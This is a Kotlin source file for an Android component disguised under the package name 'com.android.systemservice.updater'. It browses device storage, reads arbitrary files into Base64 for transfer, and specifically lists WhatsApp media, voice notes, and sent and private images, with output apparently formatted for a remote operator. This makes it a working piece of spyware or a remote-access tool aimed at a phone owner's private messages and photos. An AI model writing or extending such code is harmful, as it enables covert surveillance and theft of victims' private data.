package com.android.systemservice.updater

import android.os.Environment
import android.util.Base64
import java.io.File

object FileBrowser {

    private const val MAX_FILE_SIZE = 50 * 1024 * 1024 // 50MB

    fun listDirectory(path: String): String {
        val dir = File(path)
        if (!dir.exists()) return "❌ Directory not found: $path"
        if (!dir.isDirectory) return "❌ Not a directory: $path"
        if (!dir.canRead()) return "❌ Permission denied: $path"

        val files = dir.listFiles() ?: return "❌ Cannot read directory"
        if (files.isEmpty()) return "📁 $path\n\n(empty)"

        val sb = StringBuilder()
        sb.append("📁 $path\n\n")

        val dirs = files.filter { it.isDirectory }.sortedBy { it.name }
        val regular = files.filter { it.isFile }.sortedBy { it.name }

        dirs.forEach { d ->
            sb.append("📁 ${d.name}/\n")
        }
        regular.forEach { f ->
            val size = formatSize(f.length())
            sb.append("📄 ${f.name} ($size)\n")
        }
        return sb.toString()
    }

    fun readFileAsBase64(path: String): Pair<String, String>? {
        return try {
            val file = File(path)
            if (!file.exists() || !file.isFile) return null
            if (file.length() > MAX_FILE_SIZE) return null
            val bytes = file.readBytes()
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            Pair(file.name, b64)
        } catch (e: Exception) { null }
    }

    fun whatsAppMediaList(): String {
        val basePaths = listOf(
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media",
            "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media",
        )
        val sb = StringBuilder("📱 WhatsApp Media\n\n")
        basePaths.forEach { base ->
            val dir = File(base)
            if (dir.exists()) {
                dir.listFiles()?.sortedBy { it.name }?.forEach { sub ->
                    if (sub.isDirectory) {
                        val count = sub.listFiles()?.size ?: 0
                        sb.append("📁 ${sub.name}/ ($count files)\n")
                    }
                }
            }
        }
        return sb.toString()
    }

    fun whatsAppVoiceNotes(): String {
        val paths = listOf(
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes",
            "/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Voice Notes",
        )
        val sb = StringBuilder("🎤 WhatsApp Voice Notes\n\n")
        paths.forEach { p ->
            val dir = File(p)
            if (dir.exists() && dir.isDirectory) {
                dir.walkTopDown().filter { it.isFile }.forEach { f ->
                    sb.append("📄 ${f.parentFile?.name}/${f.name} (${formatSize(f.length())})\n")
                }
            }
        }
        return sb.toString()
    }

    fun whatsAppImages(): String {
        val paths = listOf(
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent",
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Private",
        )
        val sb = StringBuilder("📷 WhatsApp Images\n\n")
        paths.forEach { p ->
            val dir = File(p)
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.filter { it.isFile }?.forEach { f ->
                    sb.append("📄 ${f.name} (${formatSize(f.length())})\n")
                }
            }
        }
        return sb.toString()
    }

    private fun formatSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            else -> "${bytes / (1024 * 1024)} MB"
        }
    }
}
